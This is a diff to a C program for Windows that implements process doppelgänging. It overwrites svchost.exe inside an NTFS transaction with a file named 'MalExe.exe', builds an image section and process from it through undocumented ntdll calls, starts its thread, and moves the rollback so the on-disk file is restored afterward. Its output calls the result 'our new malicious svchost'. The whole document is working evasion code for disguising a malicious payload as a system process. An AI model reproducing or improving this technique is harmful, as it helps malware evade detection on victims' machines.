@@ -105,9 +105,15 @@ LPVOID GetBaseAddressByName(HANDLE hProcess)
 
 int main(void)
 {
+
 	LARGE_INTEGER liFileSize;
 	DWORD dwFileSize;
 	HANDLE hSection;
+	NTSTATUS ret;
+	//WCHAR stringBuffer[MAX_PATH];//= L"C:\\Users\\Administrator\\Desktop\\svchost.exe";//L"C:\\Windows\\SysWOW64\\svchost.exe";
+	
+	UNICODE_STRING  string;
+
 	HANDLE hNtdll = GetModuleHandle("ntdll.dll");
 	if (NULL==hNtdll)
 	{
@@ -124,7 +130,7 @@ int main(void)
 	}
 	printf("[+] Got NtCreateSection at 0x%08p\n", createSection);
 
-	HANDLE hTransaction = CreateTransaction(NULL,0,0,0,0,0,NULL);
+	HANDLE hTransaction = CreateTransaction(NULL,0,0,0,0,0,L"svchost.exe");
 	if (INVALID_HANDLE_VALUE == hTransaction)
 	{
 		DisplayErrorText(GetLastError());
@@ -132,7 +138,8 @@ int main(void)
 	}
 	printf("[+] Created a transaction, handle 0x%x\n", hTransaction);
 
-	HANDLE hTransactedFile = CreateFileTransacted("svchost.exe", GENERIC_WRITE | GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL, hTransaction, NULL, NULL);
+	HANDLE hTransactedFile = CreateFileTransacted("svchost.exe",
+		GENERIC_WRITE | GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL, hTransaction, NULL, NULL);
 	if (INVALID_HANDLE_VALUE == hTransactedFile)
 	{
 		DisplayErrorText(GetLastError());
@@ -140,8 +147,8 @@ int main(void)
 	}
 	printf("[+] CreateFileTransacted on svchost, handle 0x%x\n", hTransactedFile);
 
-	HANDLE hExe = CreateFile("MalExe.exe"
-		, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+	HANDLE hExe = CreateFile("MalExe.exe",
+		 GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
 	if (INVALID_HANDLE_VALUE == hExe)
 	{
 		DisplayErrorText(GetLastError());
@@ -182,8 +189,7 @@ int main(void)
 	}
 	printf("[+] over wrote svchost in transcation\n");
 
-	
-	NTSTATUS ret = createSection(&hSection, SECTION_ALL_ACCESS, NULL, 0, PAGE_READONLY, SEC_IMAGE, hTransactedFile);
+	ret = createSection(&hSection, SECTION_ALL_ACCESS, NULL, 0, PAGE_READONLY, SEC_IMAGE, hTransactedFile);
 	if(FALSE == NT_SUCCESS(ret))
 	{
 		DisplayErrorText(GetLastError());
@@ -191,12 +197,7 @@ int main(void)
 	}
 	printf("[+] created a section with our new malicious svchost\n");
 
-	if (FALSE == RollbackTransaction(hTransaction))
-	{
-		DisplayErrorText(GetLastError());
-		return -1;
-	}
-	printf("[+] rolling back the original svchost\n");
+
 
 	NtCreateProcessEx createProcessEx = (NtCreateProcessEx)GetProcAddress(hNtdll, "NtCreateProcessEx");
 	if (NULL == createProcessEx)
@@ -206,14 +207,19 @@ int main(void)
 	}
 	printf("[+] Got NtCreateProcessEx 0x%08p\n", createProcessEx);
 
-	HANDLE hProcess;
-	ret = createProcessEx(&hProcess, GENERIC_ALL, NULL, GetCurrentProcess(), PS_INHERIT_HANDLES, hSection, NULL, NULL, FALSE);
+	HANDLE hProcess=0;
+	my_RtlInitUnicodeString initUnicodeString = (my_RtlInitUnicodeString)GetProcAddress(hNtdll, "RtlInitUnicodeString");
+	initUnicodeString(&string, L"C:\\Users\\Administrator\\Desktop\\svchost.exe");
+
+	ret = createProcessEx(&hProcess, GENERIC_ALL,NULL, GetCurrentProcess(), PS_INHERIT_HANDLES, hSection, NULL, NULL, FALSE);
+	
+	printf("[+] Created our process, handle 0x%x\n", hProcess);
 	if (FALSE == NT_SUCCESS(ret))
 	{
 		DisplayErrorText(GetLastError());
 		return -1;
 	}
-	printf("[+] Created our process, handle 0x%x\n", hProcess);
+
 
 	PIMAGE_DOS_HEADER dos_header = (PIMAGE_DOS_HEADER)buffer;
 	PIMAGE_NT_HEADERS32 ntHeader = (PIMAGE_NT_HEADERS32)(buffer + dos_header->e_lfanew);
@@ -229,11 +235,14 @@ int main(void)
 	printf("[+] Got NtCreateThreadEx 0x%08p\n", createThreadEx);
 
 	HANDLE hThread;
-	ret= createThreadEx(&hThread, GENERIC_ALL,NULL, hProcess, (LPTHREAD_START_ROUTINE)oep, NULL,TRUE, 0, 0, 0, NULL);	if (FALSE == NT_SUCCESS(ret))
+	ret= createThreadEx(&hThread, GENERIC_ALL,NULL, hProcess, (LPTHREAD_START_ROUTINE)oep, NULL,TRUE, 0, 0, 0, NULL);
+	if (FALSE == NT_SUCCESS(ret))
 	{
 		DisplayErrorText(GetLastError());
 		return -1;
-	}	printf("[+] creating thread with oep at %x\n", oep);	my_PRTL_USER_PROCESS_PARAMETERS ProcessParams = 0;
+	}
+	printf("[+] creating thread with oep at %x\n", oep);
+	my_PRTL_USER_PROCESS_PARAMETERS ProcessParams = 0;
 	RtlCreateProcessParametersEx createProcessParametersEx = (RtlCreateProcessParametersEx)GetProcAddress(hNtdll, "RtlCreateProcessParametersEx");
 	if (NULL == createProcessParametersEx)
 	{
@@ -244,13 +253,7 @@ int main(void)
 
 
 
-	WCHAR stringBuffer[] = L"C:\\Windows\\SysWOW64\\svchost.exe";
-	UNICODE_STRING  string;
-
-
-	string.Buffer = stringBuffer;
-	string.Length = sizeof(stringBuffer);
-	string.MaximumLength = sizeof(stringBuffer);
+	
 	ret = createProcessParametersEx(&ProcessParams, &string,NULL,NULL,&string,NULL,NULL,NULL,NULL,NULL, RTL_USER_PROC_PARAMS_NORMALIZED);
 	if (FALSE == NT_SUCCESS(ret))
 	{
@@ -335,8 +338,17 @@ int main(void)
 		return -1;
 	}
 	printf("[+] resumed our thread\n", peb);
+	if (FALSE == RollbackTransaction(hTransaction))
+	{
+		DisplayErrorText(GetLastError());
+		return -1;
+	}
+	printf("[+] rolling back the original svchost\n");
 
 	//TerminateProcess(hProcess, 9);
 	CloseHandle(hProcess);
+	CloseHandle(hExe);
+	CloseHandle(hTransactedFile);
+	CloseHandle(hTransaction);
 	return 0;
 }
